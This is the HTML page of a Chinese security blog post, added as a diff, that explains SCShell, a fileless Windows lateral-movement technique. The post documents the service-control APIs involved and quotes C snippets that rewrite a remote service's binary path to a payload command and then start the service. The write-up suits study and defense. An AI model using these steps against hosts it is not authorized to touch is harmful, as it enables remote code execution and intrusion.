@@ -1,0 +1,1366 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|sans-serif:300,300italic,400,400italic,700,700italic|Lato:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="内网渗透,SCShell,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="RcoIl的窝" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.png?v=5.1.0">
+
+
+
+
+
+
+<meta name="description" content="估计最近一段时间不再更新 blog，要更新的话也是对之前的文章修修补补。">
+<meta name="keywords" content="内网渗透,SCShell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【渗透技巧】SCshell 技术细节">
+<meta property="og:url" content="https://rcoil.me/2019/12/【渗透技巧】SCshell 技术细节/index.html">
+<meta property="og:site_name" content="RcoIl的窝">
+<meta property="og:description" content="估计最近一段时间不再更新 blog，要更新的话也是对之前的文章修修补补。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://rcoil.me/image/【渗透技巧】SCshell%20技术细节/diagram.svg">
+<meta property="og:image" content="https://rcoil.me/image/【渗透技巧】SCshell%20技术细节/blog_2019-12-11_23-14-22.png">
+<meta property="og:image" content="https://rcoil.me/image/【渗透技巧】SCshell%20技术细节/blog_2019-12-11_21-18-55.png">
+<meta property="og:image" content="https://rcoil.me/image/【渗透技巧】SCshell%20技术细节/blog_2019-12-11_20-59-37.png">
+<meta property="og:image" content="https://rcoil.me/image/【渗透技巧】SCshell%20技术细节/blog_2019-12-11_21-00-30.png">
+<meta property="og:updated_time" content="2019-12-20T02:06:07.734Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【渗透技巧】SCshell 技术细节">
+<meta name="twitter:description" content="估计最近一段时间不再更新 blog，要更新的话也是对之前的文章修修补补。">
+<meta name="twitter:image" content="https://rcoil.me/image/【渗透技巧】SCshell%20技术细节/diagram.svg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '6230266985318450000',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://rcoil.me/2019/12/【渗透技巧】SCshell 技术细节/">
+
+
+
+
+
+  <title> 【渗透技巧】SCshell 技术细节 | RcoIl的窝 </title>
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?ce3d1967864bac5f69f1c1a6042e5577";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">RcoIl的窝</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-count">
+          <a href="/count" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-fa fa-free-code-camp"></i> <br>
+            
+            阅读榜
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://rcoil.me/2019/12/【渗透技巧】SCshell 技术细节/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="RcoIl">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="RcoIl的窝">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                【渗透技巧】SCshell 技术细节
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-12T14:37:56+08:00">
+                2019-12-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">内网渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/12/【渗透技巧】SCshell 技术细节/" class="leancloud_visitors" data-flag-title="【渗透技巧】SCshell 技术细节">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                <!--
+				<i class="fa fa-eye"></i>
+				-->
+				<i class="fa fa-thermometer-three-quarters" aria-hidden="true"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+				 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>估计最近一段时间不再更新 blog，要更新的话也是对之前的文章修修补补。</p>
+<a id="more"></a>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><code>SCShell</code> 是一款无文件横向移动的工具，主要依赖于 <code>ChangeServiceConfigA</code> 函数，用于修改 Windows 服务的配置。该工具的优点在于它不会通过 <code>SMB</code> 协议去执行身份验证。该工具是通过 <code>DCE/RPC</code> 协议进行的。</p>
+<p>因为是远程修改服务进行的，所以它不需要注册或创建服务。也不会删除远程系统上的任何文件。</p>
+<p>与直接使用 <code>sc.exe</code> 的差别在于：<strong><em>如果当前进程无远程主机的权限，则需要使用 <code>SMB</code> 协议进行身份验证，后续步骤两者相同</em></strong>。</p>
+<h2 id="0x01-函数-API-介绍"><a href="#0x01-函数-API-介绍" class="headerlink" title="0x01 函数 API 介绍"></a>0x01 函数 API 介绍</h2><h3 id="1-1、LogonUserA"><a href="#1-1、LogonUserA" class="headerlink" title="1.1、LogonUserA"></a>1.1、LogonUserA</h3><p>该函数是使用用户和明文密码登陆到本地计算机，无法登陆远程计算机。如果函数成功，则会受到表示已登陆用户的令牌的句柄，然后可以使用此令牌句柄模拟指定用户。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">LogonUserA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR  lpszUsername,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR  lpszDomain,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR  lpszPassword,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   dwLogonType,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   dwLogonProvider,</span></span></span><br><span class="line"><span class="function"><span class="params">  PHANDLE phToken</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p><strong><em>lpszUsername：</em></strong>指向以空字符结尾的字符串的指针，该字符串指定用户的名称，也就是要登陆的用户账号。</p>
+</li>
+<li><p><strong><em>lpszDomain：</em></strong>指向以空字符结尾的字符串的指针，该字符串指定该账户的域或服务器的名称。如果此参数为 NULL，则必须以 UPN 格式指定用户名。如果此参数为 “.”，则表示使用本地账户来验证。</p>
+</li>
+<li><p><strong><em>lpszPassword：</em></strong>指向以空字符结尾的字符串的指针，该字符串指向 <em>lpszUsername</em> 中指定用户的明文密码。结束使用后，可调用 <a href="https://docs.microsoft.com/previous-versions/windows/desktop/legacy/aa366877(v=vs.85" target="_blank" rel="noopener">SecureZeroMemory</a>) 函数以清除内存中的密码。</p>
+</li>
+<li><p><strong><em>dwLogonType：</em></strong>要执行的登陆操作的类型，共计 7 个类型。此处使用 <code>LOGON32_LOGON_NEW_CREDENTIALS</code>，该登陆类型允许调用方克隆其当前令牌，并为出站连接指定新的凭据。新的登陆会话具有相同的本地标识符，但对其他网络连接使用不同的凭据。</p>
+</li>
+<li><p><strong><em>dwLogonProvider：</em></strong>指定登陆提供程序，共计 3 个值。此处使用系统标准登陆提供程序：<code>LOGON32_PROVIDER_DEFAULT</code></p>
+</li>
+<li><p><strong><em>phToken：</em></strong>指向句柄变量的指针，该变量接收代码指定用户的令牌的句柄。</p>
+</li>
+<li><p><strong><em>返回值：</em></strong>非零值</p>
+</li>
+</ul>
+<h3 id="1-2、ImpersonateLoggedOnUserA"><a href="#1-2、ImpersonateLoggedOnUserA" class="headerlink" title="1.2、ImpersonateLoggedOnUserA"></a>1.2、ImpersonateLoggedOnUserA</h3><p>与 <code>LogonUserA</code> 函数相呼应。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ImpersonateLoggedOnUser</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hToken</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong><em>hToken：</em></strong>代表已登陆用户的主或模拟 Access token 的句柄。</li>
+</ul>
+<ul>
+<li><strong><em>返回值：</em></strong>非零值</li>
+</ul>
+<h3 id="1-3、OpenSCManagerA"><a href="#1-3、OpenSCManagerA" class="headerlink" title="1.3、OpenSCManagerA"></a>1.3、OpenSCManagerA</h3><p>建立到指定计算机上的服务控制管理器的连接，并打开指定的服务控制管理器数据库。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SC_HANDLE <span class="title">OpenSCManagerA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpMachineName,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpDatabaseName,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  dwDesiredAccess</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong><em>lpMachineName：</em></strong> 目标计算机名称，如果指针为 NULL或指向空字符串，则该函数将连接本地计算机上的服务控制管理器。</li>
+<li><strong><em>lpDatabaseName：</em></strong>服务控制管理器数据库的名称。默认情况下此参数应设置为 <code>SERVICES_ACTIVE_DATABASE</code>。</li>
+<li><strong><em>dwDesiredAccess：</em></strong>对服务控制管理器的访问。此处应为 <code>SC_MANAGER_ALL_ACCESS</code>，囊括了列表中的所有权限。有关访问权限列表可参阅【<a href="https://docs.microsoft.com/zh-cn/windows/win32/services/service-security-and-access-rights" target="_blank" rel="noopener">服务安全和访问权限</a>】</li>
+<li><strong><em>返回值：</em></strong> 返回指定服务控制管理器数据库的句柄。</li>
+</ul>
+<h3 id="1-4、OpenServiceA"><a href="#1-4、OpenServiceA" class="headerlink" title="1.4、OpenServiceA"></a>1.4、OpenServiceA</h3><p>通过服务控制管理器打开现有服务。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SC_HANDLE <span class="title">OpenServiceA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  SC_HANDLE hSCManager,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpServiceName,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwDesiredAccess</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong><em>hSCManager：</em></strong>服务控制管理器数据库的句柄。</li>
+<li><strong><em>lpServiceName：</em></strong>要打开的服务的名称。该参数是由 <code>CreateService</code> 函数的 <code>lpServiceName</code> 参数指定的名称，而不是用户界面应用程序显示的用于标识服务显示名称。</li>
+<li><strong><em>dwDesiredAccess：</em></strong>访问服务。此处应为 <code>SERVICE_ALL_ACCESS</code>，囊括了列表中的所有权限。有关访问权限列表可参阅【<a href="https://docs.microsoft.com/zh-cn/windows/win32/services/service-security-and-access-rights" target="_blank" rel="noopener">服务安全和访问权限</a>】</li>
+<li><strong><em>返回值：</em></strong> 返回指定服务的句柄。</li>
+</ul>
+<h3 id="1-5、QueryServiceConfigA"><a href="#1-5、QueryServiceConfigA" class="headerlink" title="1.5、QueryServiceConfigA"></a>1.5、QueryServiceConfigA</h3><p>检索指定服务的配置参数。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">QueryServiceConfigA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  SC_HANDLE               hService,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPQUERY_SERVICE_CONFIGA lpServiceConfig,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                   cbBufSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD                 pcbBytesNeeded</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong><em>hService：</em></strong>指定服务的句柄。</li>
+<li><strong><em>lpServiceConfig：</em></strong>指向接收服务配置信息的缓冲区的指针。该数组的最大大小为 8KB。若要确定所需的大小，请设置为 NULL，而 <code>cbBufSize</code> 指定为 0。</li>
+<li><strong><em>cbBufSize：</em></strong>指向的缓冲区大小（以字节为单位）。</li>
+<li><strong><em>pcbBytesNeeded：</em></strong>如果函数失败并显示 <code>ERROR_INSUFFICIENT_BUFFER</code>，则该变量的指针将接收存储所有配置信息所需的字节数。</li>
+<li><strong><em>返回值：</em></strong> 非零值。</li>
+</ul>
+<h3 id="1-6、ChangeServiceConfigA"><a href="#1-6、ChangeServiceConfigA" class="headerlink" title="1.6、ChangeServiceConfigA"></a>1.6、ChangeServiceConfigA</h3><p>更改指定服务的配置参数。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ChangeServiceConfigA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  SC_HANDLE hService,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwServiceType,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwStartType,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwErrorControl,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpBinaryPathName,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpLoadOrderGroup,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD   lpdwTagId,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpDependencies,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpServiceStartName,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpPassword,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpDisplayName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong><em>hService：</em></strong>指定服务的句柄。</li>
+<li><strong><em>dwServiceType：</em></strong>服务类型。如果不更改现有服务类型，则指定 <code>SERVICE_NO_CHANGE</code>。</li>
+<li><strong><em>dwStartType：</em></strong>服务启动选项。如果不更改现有的启动类型，则指定 <code>SERVICE_NO_CHANGE</code>。因为要执行命令，所以使用 <code>SERVICE_DEMAND_START</code>，后续调用 <code>StartService</code> 函数时启动服务。</li>
+<li><strong><em>dwErrorControl：</em></strong>如果此服务无法启动，应该采取措施应对这个错误。此处应为 <code>SERVICE_ERROR_IGNORE</code>，忽略该错误并继续启动操作。</li>
+<li><strong><em>lpBinaryPathName：</em></strong>服务二进制文件的标准现有路径。如果不更改现有路径，请指定 NULL。如果路径包含空格，则必须使用引号括起来。该路径中还可包含二进制文件的参数。</li>
+<li><strong><em>lpLoadOrderGroup：</em></strong>该服务所属的负载排列组的名称。如果不更改现有组，请指定 NULL。</li>
+<li><strong><em>lpdwTagId：</em></strong>指向变量的指针，该变量接收在 <code>lpLoadOrderGroup</code> 参数指定的组中唯一的标记值。如果不更改现有标签，请指定 NULL。</li>
+<li><strong><em>lpDependencies：</em></strong>指向双 NULL 终止的数组，该数组以空分隔的服务或装入顺序组的名称分隔，系统必须在启动该服务之前才能启动这些名称。（对组的依赖性意味着，在尝试启动该组的所有成员之后，如果该组的至少一个成员正在运行，则该服务可以运行。）如果不更改现有的依赖性，则指定 NULL。</li>
+<li><strong><em>lpServiceStartName：</em></strong>服务将在其下运行的帐户的名称。如果不更改现有帐户名，则指定 NULL。</li>
+<li><strong><em>lpPassword：</em></strong><code>lpServiceStartName</code> 参数指定的帐户名的密码。如果不更改现有密码，请指定 NULL。</li>
+<li><strong><em>lpDisplayName：</em></strong>用来为其用户标识服务的显示名称。如果不更改现有的显示名称，则指定 NULL。</li>
+<li><strong><em>返回值：</em></strong> 非零值。</li>
+</ul>
+<h3 id="1-7、StartServiceA"><a href="#1-7、StartServiceA" class="headerlink" title="1.7、StartServiceA"></a>1.7、StartServiceA</h3><p>启动指定服务。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">StartServiceA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  SC_HANDLE hService,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwNumServiceArgs,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    *lpServiceArgVectors</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong><em>hService：</em></strong>要启动的服务的句柄。由 <code>OpenService</code> 返回。</li>
+<li><strong><em>dwNumServiceArgs：</em></strong><code>lpServiceArgVectors</code> 数组中的字符串数。如果 <code>lpServiceArgVectors</code> 为 NULL，则此参数可以为 0。</li>
+<li><strong><em>lpServiceArgVectors：</em></strong>以空值结尾的字符串将作为参数传递给服务的 <code>ServiceMain</code> 函数。如果没有参数，则此参数可以为 NULL。</li>
+<li><strong><em>返回值：</em></strong> 非零值。</li>
+</ul>
+<h2 id="0x02-技术细节"><a href="#0x02-技术细节" class="headerlink" title="0x02 技术细节"></a>0x02 技术细节</h2><h3 id="2-1、时序图"><a href="#2-1、时序图" class="headerlink" title="2.1、时序图"></a>2.1、时序图</h3><p><img src="/image/【渗透技巧】SCshell 技术细节/diagram.svg" alt=""></p>
+<p>这一整个过程与 <code>PsExec</code> 操作服务的步骤大部分相同，区别仅是因为 <code>SCshell</code>是更改配置，而 <code>PsExec</code> 是创建服务。以下内容是作者的代码实现（典型的 API 调用方式编程）。</p>
+<h3 id="2-2、登陆"><a href="#2-2、登陆" class="headerlink" title="2.2、登陆"></a>2.2、登陆</h3><p>使用 <code>LogonUserA</code> 登陆。后使用 <code>ImpersonateLoggedOnUser</code>。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(username != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Username was provided attempting to call LogonUserA\n"</span>);</span><br><span class="line">    bResult = LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &amp;hToken);</span><br><span class="line">    <span class="keyword">if</span>(!bResult) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"LogonUserA failed %ld\n"</span>, GetLastError());</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">bResult = FALSE;</span><br><span class="line">bResult = ImpersonateLoggedOnUser(hToken);</span><br></pre></td></tr></table></figure>
+<h3 id="2-3、Service-Manager"><a href="#2-3、Service-Manager" class="headerlink" title="2.3、Service Manager"></a>2.3、Service Manager</h3><p>一旦当前进程获取了正确的身份验证，即可使用 <code>OpenSCManagerA</code>  打开远程机器的服务控制管理器，并且获取其数据库的句柄。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SC_HANDLE schManager = OpenSCManagerA(targetHost, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">    <span class="keyword">if</span>(schManager == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"OpenSCManagerA failed %ld\n"</span>, GetLastError());</span><br><span class="line">        ExitProcess(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"SC_HANDLE Manager 0x%p\n"</span>, schManager);</span><br></pre></td></tr></table></figure>
+<p>与该数据库句柄进行交互即可。通过该数据库句柄，使用 <code>OpenServiceA</code> 打开需要的现有服务。比如作者在演示中使用的是 <code>XblAuthManager</code> 服务。后续使用中，为了更方便使用，可以选择一些较为通用的服务代替。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Opening %s\n"</span>, serviceName);</span><br><span class="line">SC_HANDLE schService = OpenServiceA(schManager, serviceName, SERVICE_ALL_ACCESS);</span><br><span class="line"><span class="keyword">if</span>(schService == <span class="literal">NULL</span>) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"OpenServiceA failed %ld\n"</span>, GetLastError());</span><br><span class="line">  ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"SC_HANDLE Service 0x%p\n"</span>, schService);</span><br></pre></td></tr></table></figure>
+<p>之所以要查询服务的配置信息，是为了获取原始服务二进制的路径。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">QueryServiceConfigA(schService, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;dwSize);</span><br><span class="line"><span class="keyword">if</span>(dwSize) &#123;</span><br><span class="line">  <span class="comment">// This part is not critical error will not stop the program</span></span><br><span class="line">  dwLpqscSize = dwSize;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"LPQUERY_SERVICE_CONFIGA need 0x%08x bytes\n"</span>, dwLpqscSize);</span><br><span class="line">  lpqsc = GlobalAlloc(GPTR, dwSize);</span><br><span class="line">  bResult = FALSE;</span><br><span class="line">  bResult = QueryServiceConfigA(schService, lpqsc, dwLpqscSize, &amp;dwSize);</span><br><span class="line">  originalBinaryPath = lpqsc-&gt;lpBinaryPathName;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Original service binary path \"%s\"\n"</span>, originalBinaryPath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用 <code>ChangeServiceConfigA</code> 更改已打开的服务的配置。通常可以直接使用 <code>C:\Windows\System32\cmd.exe args1 args2</code> 这样的配置替换掉二进制文件路径中的内容。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+<p>通过调用 <code>StartService</code> 函数时启动已更改配置的服务。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bResult = StartServiceA(schService, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
